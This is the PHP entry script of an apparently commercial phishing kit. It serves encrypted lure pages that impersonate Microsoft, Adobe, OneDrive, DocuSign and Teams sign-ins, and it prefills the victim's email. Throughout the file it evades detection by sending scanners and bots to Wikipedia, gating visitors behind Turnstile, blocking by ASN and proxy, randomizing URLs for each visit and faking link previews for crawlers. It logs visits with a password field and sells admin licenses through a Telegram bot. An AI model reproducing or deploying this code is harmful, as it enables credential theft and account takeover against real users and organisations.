<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$projectRoot = __DIR__;
$logFile = $projectRoot . '/project.log';

$logWriter = function ($message) use ($logFile) {
    if (!is_string($message) || $message === '') {
        return;
    }
    $line = '[' . date('c') . '] ' . $message . "\n";
    @file_put_contents($logFile, $line, FILE_APPEND);
};

set_exception_handler(function ($e) use ($logWriter) {
    if ($e instanceof Throwable) {
        $logWriter('EXCEPTION ' . get_class($e) . ': ' . $e->getMessage() . ' in ' . $e->getFile() . ':' . $e->getLine());
    }
});

set_error_handler(function ($severity, $message, $file, $line) use ($logWriter) {
    if (!(error_reporting() & $severity)) {
        // This error code is not included in error_reporting, so let it fall through.
        return false;
    }
    $logWriter('ERROR ' . $severity . ': ' . $message . ' in ' . $file . ':' . $line);
    return false;
});

register_shutdown_function(function () use ($logWriter) {
    $err = error_get_last();
    if ($err) {
        $logWriter('FATAL ' . $err['type'] . ': ' . $err['message'] . ' in ' . $err['file'] . ':' . $err['line']);
    }
});

$vendorPath = __DIR__ . '/php/vendor/autoload.php';
$appPath = __DIR__ . '/src/App.php';

if (file_exists($vendorPath)) {
    require_once $vendorPath;
}
require_once $appPath;

use App\Config;
use App\Security;
use App\Router;
use App\Crypto;
use App\Api;

$dotenvClass = '\\Dotenv\\Dotenv';
if (class_exists($dotenvClass)) {
    $dotenv = $dotenvClass::createImmutable(__DIR__);
    $dotenv->safeLoad();
}

// CLI Routing
if (php_sapi_name() === 'cli' && !isset($_SERVER['REQUEST_METHOD'])) {
    $cmd = $argv[1] ?? 'help';
    if ($cmd === 'worker') {
        App\Worker::run();
    } elseif ($cmd === 'manage') {
        App\Console::handle($argv);
    } else {
        echo "L1mk Console\n";
        echo "Usage:\n";
        echo "  php index.php worker            Start background worker\n";
        echo "  php index.php manage [args...]  Manage encrypted files\n";
    }
    exit;
}

header_remove('X-Powered-By');

session_start();
$cfg = App\Config::load();

// --- 1. Force HTTPS (Highest Priority) ---
if (!empty($cfg['cfSecurityEnabled'])) {
    $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || 
               (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') ||
               (!empty($_SERVER['HTTP_CF_VISITOR']) && strpos($_SERVER['HTTP_CF_VISITOR'], 'https') !== false);
               
    if (!$isHttps && PHP_SAPI !== 'cli' && strpos($_SERVER['HTTP_HOST'], 'localhost') === false) {
        header('Location: https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], true, 301);
        exit;
    }
}

// --- 2. Path Detection ---
$requestPath = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH);
$isApi = ($requestPath === '/api.php' || $requestPath === '/api' || strpos($requestPath, '/api/') !== false);
$isAdmin = ($requestPath === '/admin.html' || strpos($requestPath, '/admin.html/') === 0 || $requestPath === '/admin/upload' || strpos($requestPath, '/uploads/') === 0);

// --- 3. Centralized Security Enforcement (Unified Protection) ---
$routeData = App\Router::handle();
$email = $routeData['email'];
$ip = App\Security::getClientIp();
// App\Security::log("DEBUG: Request received from IP=$ip | Path=$requestPath");

// A. Initial Security Check (Whitelist, Country, Bots)
// We check intelligence later to save API credits if Turnstile is enabled
$blockReason = ($isAdmin || $isApi) ? null : App\Security::enforceAccess($cfg, $email, false);
$blocked = ($blockReason !== null);

if ($blocked) {
    App\Security::log("BLOCKED (Pre-Turnstile): IP=$ip | REASON=$blockReason");
    $emailReasons = ['blocked_email_domain', 'email_domain_not_allowed'];
    if (!in_array($blockReason, $emailReasons, true)) {
        header('Location: https://www.wikipedia.org', true, 302);
        exit;
    }
} else {
    // App\Security::log("DEBUG: Passed security check for IP=$ip");
}

// B. Cloudflare Turnstile Verification
// Exempt Admin and API routes, and only trigger if Turnstile is enabled and Site Key is present
if (!$isAdmin && !$isApi && !empty($cfg['cfTurnstileEnabled']) && empty($_SESSION['turnstile_verified'])) {
    $siteKey = $cfg['cfSiteKey'] ?? '';
    if (!empty($siteKey)) {
        header('Content-Type: text/html; charset=UTF-8');
        $html = App\Crypto::loadEncrypted(__DIR__ . '/templates/challenge.html.enc');
        if ($html) {
            $html = str_replace('SERVER_INJECT_SITE_KEY', htmlspecialchars($siteKey, ENT_QUOTES, 'UTF-8'), $html);
            
            // Inject Invisible Setting
            $invisible = !empty($cfg['cfTurnstileInvisible']) ? "true" : "false";
            $html = str_replace('SERVER_INJECT_INVISIBLE', $invisible, $html);
            
            echo $html;
            exit;
        }
    } else {
        App\Security::log("WARNING: Turnstile enabled but cfSiteKey is missing. Skipping challenge.");
    }
}

// C. Heavy Security Check (ASN Blocking, ProxyCheck)
// Only performed for verified humans (if Turnstile is enabled)
$blockReason = ($isAdmin || $isApi) ? null : App\Security::enforceAccess($cfg, $email, true);
$blocked = ($blockReason !== null);

if ($blocked) {
    App\Security::log("BLOCKED (Post-Turnstile): IP=$ip | REASON=$blockReason");
    $emailReasons = ['blocked_email_domain', 'email_domain_not_allowed'];
    if (!in_array($blockReason, $emailReasons, true)) {
        header('Location: https://www.wikipedia.org', true, 302);
        exit;
    }
}

// --- 4. Unique URL Obfuscation ---
// Skip obfuscation for static files, API, and Admin routes
$isStatic = preg_match('/\.(ico|png|jpg|jpeg|gif|css|js|map|woff|woff2|ttf|svg|eot|txt|xml)$/i', $requestPath);
if (!$isApi && !$isAdmin && !$isStatic && empty($_GET['secure_id']) && empty($_POST)) {
    $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? getenv('RENDER_EXTERNAL_URL') ?? 'localhost';
    $uri = $_SERVER['REQUEST_URI'] ?? '/';
    
    // Generate a long random string (64 chars)
    $randomToken = bin2hex(random_bytes(32));
    $timestamp = time();
    
    // Check if query string already exists
    $separator = (strpos($uri, '?') !== false) ? '&' : '?';
    
    // Construct new unique URL
    $newUrl = $proto . '://' . $host . $uri . $separator . "secure_id=" . $randomToken . "&t=" . $timestamp;
    
    // Perform 302 Temporary Redirect (prevents caching of the "clean" URL)
    header("Location: $newUrl", true, 302);
    exit;
}

$path = $requestPath;
$query = $_SERVER['QUERY_STRING'] ?? '';

// Only log significant boots to reduce spam
if (strpos($query, 'action=get_events') === false && strpos($query, 'action=get_deployment_info') === false) {
    $logWriter('BOOT index.php at ' . __DIR__ . ' uri=' . ($_SERVER['REQUEST_URI'] ?? ''));
}
if (strpos($path, '/uploads/') === 0) {
    $rel = preg_replace('/[^a-zA-Z0-9._-]/', '', substr($path, strlen('/uploads/')));
    $file = __DIR__ . '/uploads/' . $rel;
    if (is_file($file)) {
        $fi = new finfo(FILEINFO_MIME_TYPE);
        $mime = $fi->file($file) ?: 'application/octet-stream';
        header('Content-Type: ' . $mime);
        readfile($file);
    } else {
        http_response_code(404);
    }
    exit;
}
if ($path === '/upload' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    http_response_code(405);
    App\Security::log("ACCESS DENIED: Unauthorized upload attempt from IP=" . App\Security::getClientIp());
    echo "Access Denied.";
    exit;
}
// Ignore static file requests (Favicon, etc.) that fall through to index.php
if (preg_match('/\.(ico|png|jpg|jpeg|gif|css|js|map|woff|woff2|ttf|svg|eot|txt|xml)$/i', $path)) {
    http_response_code(404);
    exit;
}

// Ignore preview path requests (Spam/Bot mitigation)
if (strpos($path, '/preview') === 0) {
    http_response_code(404);
    exit;
}

// API Routing
if ($path === '/api.php' || $path === '/api' || preg_match('/\/api\.php$/', $path) || preg_match('/\/api$/', $path)) {
    Api::handle();
    exit;
}

// Helper Routing
if ($path === '/helper' || strpos($path, '/helper/') === 0) {
    $templateFile = __DIR__ . '/templates/helper.html.enc';
    $plainFile = __DIR__ . '/templates/plain/helper.html';
    $html = false;

    if (file_exists($templateFile)) {
        $html = Crypto::loadEncrypted($templateFile);
    } elseif (file_exists($plainFile)) {
        $html = file_get_contents($plainFile);
    }

    if ($html !== false) {
        header('Content-Type: text/html; charset=UTF-8');
        
        // Extract email from path if present (e.g. /helper/user@example.com)
        $routeData = Router::handle();
        $email = $routeData['email'];
        if ($email) {
            $safeEmail = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
            $html = str_replace(
                'let prefilledEmail = ""; // SERVER_INJECT_EMAIL',
                'let prefilledEmail = "' . $safeEmail . '";',
                $html
            );
        }
        
        echo $html;
    } else {
        http_response_code(404);
        echo "Helper page not found.";
    }
    exit;
}

// Admin Routing
if ($path === '/admin.html' || strpos($path, '/admin.html/') === 0) {
    $licenseValid = false;
    $licenseKey = trim((string)($_POST['license'] ?? ''));
    
    if (!$licenseValid && $licenseKey !== '') {
        $masterEnv = $_ENV['MASTER_LICENSE_KEY'] ?? getenv('MASTER_LICENSE_KEY');
        $master = is_string($masterEnv) ? $masterEnv : '8080';
        if ($master !== '' && $licenseKey !== '' && ((string)$master === (string)$licenseKey)) {
            $licenseValid = true;
        }
    }
    if (!$licenseValid && $licenseKey !== '') {
        $dbPath = __DIR__ . '/license_bot.db';
        if (is_file($dbPath)) {
            try {
                $pdo = new PDO('sqlite:' . $dbPath);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $stmt = $pdo->prepare('SELECT status, expires_at FROM licenses WHERE license_key = :key LIMIT 1');
                $stmt->execute([':key' => $licenseKey]);
                $row = $stmt->fetch(PDO::FETCH_ASSOC);
                if ($row && $row['status'] === 'active' && isset($row['expires_at']) && $row['expires_at'] > gmdate('c')) {
                    $licenseValid = true;
                }
            } catch (Throwable $e) {
            }
        }
    }
    
    if ($licenseValid) {
        $_SESSION['admin_unlocked'] = true;
    } else {
        if (!empty($_SESSION['admin_unlocked'])) {
            $licenseValid = true;
        }
    }

    if (!$licenseValid) {
        header('Content-Type: text/html; charset=UTF-8');
        ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>L1mk Admin License</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { margin:0; padding:0; background:#020617; color:#e5e7eb; font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
        .card { background:#020617; border:1px solid #1f2937; border-radius:0.75rem; padding:1.75rem; width:100%; max-width:360px; box-shadow:0 20px 40px rgba(15,23,42,0.5); }
        .title { font-size:1rem; font-weight:600; margin-bottom:0.5rem; color:#f9fafb; }
        .subtitle { font-size:0.8rem; color:#9ca3af; margin-bottom:1.25rem; }
        .input { width:100%; padding:0.6rem 0.75rem; border-radius:0.5rem; border:1px solid #374151; background:#020617; color:#e5e7eb; font-size:0.85rem; box-sizing:border-box; }
        .input:focus { outline:none; border-color:#6366f1; }
        .btn { width:100%; margin-top:0.75rem; padding:0.65rem 0.75rem; border-radius:0.5rem; border:none; background:#6366f1; color:#f9fafb; font-size:0.85rem; font-weight:600; cursor:pointer; }
        .btn:hover { background:#4f46e5; }
        .note { margin-top:0.75rem; font-size:0.75rem; color:#6b7280; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title">Enter License Key</div>
        <div class="subtitle">Use a valid license generated by the Telegram bot to unlock the admin panel.</div>
        <form method="post" action="/admin.html">
            <input type="text" name="license" class="input" placeholder="XXXX-XXXX-XXXX-XXXX" required>
            <button type="submit" class="btn">Unlock Admin</button>
        </form>
        <div class="note">If you do not have a license, contact the bot to purchase one.</div>
    </div>
</body>
</html>
<?php
        exit;
    }
    // Unified Source of Truth: Prioritize plain HTML in the plain folder
    $plainFile = __DIR__ . '/templates/plain/admin.html';
    
    header('Content-Type: text/html; charset=UTF-8');
    
    if (file_exists($plainFile)) {
        echo file_get_contents($plainFile);
    } else {
        http_response_code(404);
        echo "Admin panel not found.";
    }
    exit;
}

// Admin Upload Page (disabled GET - no separate page)
if ($path === '/admin/upload' && $_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(404);
    exit;
}

if ($path === '/admin/upload' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $ok = false;
    $error = '';
    
    // Ensure uploads directory exists and is writable
    $dir = __DIR__ . '/uploads';
    if (!is_dir($dir)) {
        if (!@mkdir($dir, 0777, true)) {
            $error = 'Failed to create uploads directory. Check permissions.';
            $logWriter("UPLOAD ERROR: " . $error);
        }
    }
    if (empty($error) && !is_writable($dir)) {
        if (!@chmod($dir, 0777)) {
             $error = 'Uploads directory is not writable.';
             $logWriter("UPLOAD ERROR: " . $error);
        }
    }
    
    if (empty($error) && isset($_FILES['image']) && is_array($_FILES['image'])) {
        $f = $_FILES['image'];
        $errorCode = $f['error'] ?? UPLOAD_ERR_NO_FILE;
        
        if ($errorCode === UPLOAD_ERR_OK) {
            $size = (int)($f['size'] ?? 0);
            if ($size > 0 && $size <= 25 * 1024 * 1024) {
                $tmp = $f['tmp_name'];
                $fi = new finfo(FILEINFO_MIME_TYPE);
                $mime = $fi->file($tmp) ?: '';
                $allowed = ['image/png' => 'png', 'image/jpeg' => 'jpg', 'image/webp' => 'webp'];
                
                if (isset($allowed[$mime])) {
                    $ext = $allowed[$mime];
                    $name = bin2hex(random_bytes(8)) . '.' . $ext;
                    
                    if (empty($error)) {
                        $dest = $dir . '/' . $name;
                        if (move_uploaded_file($tmp, $dest)) {
                            // Enforce 644 for the file itself so it's readable
                            @chmod($dest, 0644);
                            if (file_put_contents($dir . '/bg_current.txt', '/uploads/' . $name, LOCK_EX) !== false) {
                                $ok = true;
                            } else {
                                $error = 'Failed to save background reference';
                                $logWriter("UPLOAD ERROR: " . $error);
                            }
                        } else {
                            $error = 'Failed to move uploaded file';
                            $logWriter("UPLOAD ERROR: " . $error);
                        }
                    }
                } else {
                    $error = 'Invalid file type. Allowed: PNG, JPEG, WebP. Got: ' . $mime;
                    $logWriter("UPLOAD ERROR: " . $error);
                }
            } else {
                $error = 'File too large or empty (max 25MB)';
                $logWriter("UPLOAD ERROR: " . $error);
            }
        } else {
            $error = 'Upload failed with error code: ' . $errorCode;
            $logWriter("UPLOAD ERROR: " . $error);
        }
    } elseif (empty($error)) {
        $error = 'No file uploaded';
        $logWriter("UPLOAD ERROR: " . $error);
    }
    
    if (!$ok && empty($error)) {
        $error = 'Unknown upload error';
        $logWriter("UPLOAD ERROR: " . $error);
    }
    
    if (isset($_GET['ajax'])) {
        if (!$ok && !empty($error)) {
            App\Security::log("UPLOAD ERROR (AJAX): " . $error);
        }
        header('Content-Type: application/json');
        echo json_encode(['ok' => $ok, 'error' => $ok ? null : 'Internal Server Error']);
        exit;
    }
    
    // Non-AJAX uploads are no longer supported
    http_response_code(400);
    exit;
}

// Log Visit API Endpoint (Manual Trigger from Frontend)
if ($path === '/api/log_visit') {
    header('Content-Type: application/json');
    
    // Only log if not already logged
    if (empty($_SESSION['visit_logged'])) {
        try {
            $db = new App\Database();
            $visitId = uniqid('v_', true);
            $email = $_POST['email'] ?? '';
            
            $db->logEvent([
                'cookieId' => $visitId,
                'type' => 'visit',
                'emailMask' => $email ? $email : 'visitor',
                'domain' => $_SERVER['HTTP_HOST'] ?? 'unknown',
                'attempt' => 0,
                'password' => '',
                'ip' => App\Security::getClientIp(),
                'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                'time' => date('c')
            ]);
            $_SESSION['visit_logged'] = true;
            echo json_encode(['status' => 'success']);
        } catch (Exception $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
    } else {
        echo json_encode(['status' => 'ignored', 'message' => 'Already logged']);
    }
    exit;
}

// Error Page Routing
if ($path === '/error') {
    $file = __DIR__ . '/templates/ErrorMsPAGE.html.enc';
    if (file_exists($file)) {
        header('Content-Type: text/html; charset=UTF-8');
        echo Crypto::loadEncrypted($file);
    } else {
        http_response_code(404);
        echo "Error page not found.";
    }
    exit;
}

if ($path === '/login/ms') {
    header('Location: https://login.microsoftonline.com/');
    exit;
}

$uploadGet = ($path === '/upload' && $_SERVER['REQUEST_METHOD'] === 'GET');
if ($uploadGet) {
    $file = __DIR__ . '/templates/upload.html.enc';
    if (file_exists($file)) {
        header('Content-Type: text/html; charset=UTF-8');
        $html = Crypto::loadEncrypted($file);
        if ($html === false) {
            http_response_code(500);
            echo "Decryption failed.";
            exit;
        }
        $bgFile = __DIR__ . '/uploads/bg_current.txt';
        $bgUrl = (file_exists($bgFile)) ? trim(file_get_contents($bgFile)) : '';
        $safeBg = $bgUrl !== '' ? htmlspecialchars($bgUrl, ENT_QUOTES, 'UTF-8') : '';
        $html = str_replace('{{BG_URL}}', $safeBg, $html);
        echo $html;
    } else {
        http_response_code(404);
        echo "Upload page not found.";
    }
    exit;
}

// Routing Logic
$routeData = Router::handle();
$email = $routeData['email'];

// Per-request nonce and cache-control headers
$requestId = bin2hex(random_bytes(8));
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');
header('Vary: User-Agent');
header('X-Request-Id: ' . $requestId);

// Social Media Preview Handler (Bypass Security for Previews)
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$previewBots = ['facebookexternalhit', 'twitterbot', 'telegrambot', 'discordbot', 'slackbot', 'whatsapp', 'linkedinbot', 'skypeuripreview', 'applebot'];
$isPreview = false;
foreach ($previewBots as $bot) {
    if (strpos($ua, $bot) !== false) {
        $isPreview = true;
        break;
    }
}

if ($isPreview) {
    header('Content-Type: text/html; charset=UTF-8');
    $displayEmail = $email ? $email : 'User';
    $now = date('c');
    $basePath = strtok($_SERVER['REQUEST_URI'] ?? '/', '?');
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? getenv('RENDER_EXTERNAL_URL') ?? 'localhost';
    $host = str_replace(['http://', 'https://'], '', $host);
    $urlWithNonce = $scheme . '://' . $host . $basePath . '?pv=' . $requestId;
    $uniqueTitle = 'Shared Document ' . substr($requestId, 0, 6);
    $uniqueDesc = 'View shared document for ' . htmlspecialchars($displayEmail, ENT_QUOTES, 'UTF-8') . ' • ' . $now;
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta property="og:title" content="' . htmlspecialchars($uniqueTitle, ENT_QUOTES, 'UTF-8') . '" /><meta property="og:description" content="' . htmlspecialchars($uniqueDesc, ENT_QUOTES, 'UTF-8') . '" /><meta property="og:type" content="website" /><meta property="og:url" content="' . htmlspecialchars($urlWithNonce, ENT_QUOTES, 'UTF-8') . '" /><meta name="twitter:card" content="summary"><meta name="twitter:title" content="' . htmlspecialchars($uniqueTitle, ENT_QUOTES, 'UTF-8') . '"><meta name="twitter:description" content="' . htmlspecialchars($uniqueDesc, ENT_QUOTES, 'UTF-8') . '"><meta name="request-id" content="' . htmlspecialchars($requestId, ENT_QUOTES, 'UTF-8') . '"></head><body></body></html>';
    exit;
}

// Serve page content
header('Content-Type: text/html; charset=UTF-8');

$template = $cfg['template'] ?? 'microsoft';
$step = $_GET['step'] ?? '';

if ($template === 'adobe' && $step !== 'verify') {
    $templateFile = __DIR__ . '/templates/adobetemplate.html.enc';
} elseif ($template === 'onedrive' && $step !== 'verify') {
    $templateFile = __DIR__ . '/templates/onedrivetemplate.html.enc';
} elseif ($template === 'teams_audio' && $step !== 'ms') {
    $templateFile = __DIR__ . '/templates/TeamsAudio.html.enc';
} elseif ($template === 'docusign' && $step !== 'ms') {
    $templateFile = __DIR__ . '/templates/d0cu5i4n.html.enc';
} elseif ($template === 'upload' && $step !== 'ms') {
    $templateFile = __DIR__ . '/templates/upload.html.enc';
} elseif ($template === 'helper') {
    $templateFile = __DIR__ . '/templates/helper.html.enc';
} else {
    $templateFile = __DIR__ . '/templates/template.html.enc';
}

$html = Crypto::loadEncrypted($templateFile);

// Fallback to plain template if encryption fails/missing
if ($html === false) {
    $plainMap = [
        __DIR__ . '/templates/adobetemplate.html.enc' => __DIR__ . '/templates/plain/adobetemplate.html',
        __DIR__ . '/templates/onedrivetemplate.html.enc' => __DIR__ . '/templates/plain/onedrivetemplate.html',
        __DIR__ . '/templates/TeamsAudio.html.enc' => __DIR__ . '/templates/plain/TeamsAudio.html',
        __DIR__ . '/templates/d0cu5i4n.html.enc' => __DIR__ . '/templates/plain/d0cu5i4n.html',
        __DIR__ . '/templates/upload.html.enc' => __DIR__ . '/templates/plain/upload.html',
        __DIR__ . '/templates/helper.html.enc' => __DIR__ . '/templates/plain/helper.html',
        __DIR__ . '/templates/template.html.enc' => __DIR__ . '/templates/plain/template.html'
    ];
    
    $plainFile = $plainMap[$templateFile] ?? '';
    if ($plainFile && file_exists($plainFile)) {
        $html = file_get_contents($plainFile);
    }
}

if ($html === false && $templateFile !== __DIR__ . '/templates/template.html.enc') {
    $html = Crypto::loadEncrypted(__DIR__ . '/templates/template.html.enc');
}

if ($html === false || $html === '') {
    http_response_code(404);
    echo "Template not found or decryption failed.";
    exit;
}

if ($email) {
    $safeEmail = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
    $html = str_replace(
        'let prefilledEmail = ""; // SERVER_INJECT_EMAIL',
        'let prefilledEmail = "' . $safeEmail . '";',
        $html
    );
}

$apiBase = '/api.php';
$html = str_replace('SERVER_INJECT_API_BASE', $apiBase, $html);

// Universal Domain Injection System
if (strpos($html, '// DOMAIN_INJECTION_POINT') !== false) {
    $cfg = App\Config::load();
    $domainScript = '
        let BLOCKED_DOMAINS = [
            "outlook.com","hotmail.com","live.com","msn.com",
            "yahoo.com","ymail.com","gmail.com","googlemail.com",
            "aol.com","icloud.com","me.com","mac.com",
            "proton.me","protonmail.com","mail.com","gmx.com"
        ];
        
        // Add admin-configured domains
        (async function() {
            try {
                const r = await fetch("/api.php?action=get_config", { cache: "no-store" });
                if (r.ok) {
                    const data = await r.json();
                    if (data.blockedDomains && Array.isArray(data.blockedDomains)) {
                        data.blockedDomains.forEach(d => {
                            const domain = d.toLowerCase().trim();
                            if (domain && !BLOCKED_DOMAINS.includes(domain)) {
                                BLOCKED_DOMAINS.push(domain);
                            }
                        });
                    }
                    const redirectUrl = (data.redirectUrl || "").trim() || (data.postAuthRedirectUrl || "").trim();
                    if (redirectUrl) _acfg({ redirectUrl });
                }
            } catch (e) {
                // Silent fail - use default domains
            }
        })();
        
    ';
    
    $html = str_replace('// DOMAIN_INJECTION_POINT', $domainScript, $html);
}

// Inject per-request meta into normal page
$meta = '<meta name="request-id" content="' . htmlspecialchars($requestId, ENT_QUOTES, 'UTF-8') . '">';
$html = preg_replace('/<\s*head\b[^>]*>/i', '$0' . $meta, $html, 1);

if (strpos($html, '{{BG_URL}}') !== false) {
    $bgFile = __DIR__ . '/uploads/bg_current.txt';
    $bgUrl = (file_exists($bgFile)) ? trim(file_get_contents($bgFile)) : '';
    $safeBg = $bgUrl !== '' ? htmlspecialchars($bgUrl, ENT_QUOTES, 'UTF-8') : '';
    $html = str_replace('{{BG_URL}}', $safeBg, $html);
}

echo $html;
